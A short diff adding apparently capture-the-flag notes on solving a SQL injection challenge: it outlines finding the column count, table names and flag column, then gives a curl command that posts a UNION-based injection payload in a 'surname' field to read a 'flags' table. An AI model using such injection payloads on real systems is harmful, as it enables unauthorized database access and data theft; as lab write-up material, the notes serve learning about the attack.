@@ -1,0 +1,3 @@
+using SQL Injection, determine the number or columns in the original table, table names and the letter 
+with which the column containing the flag is. The final command is:
+curl -s $url --data-raw "surname=admin' UNION select v,null,null from flags -- "
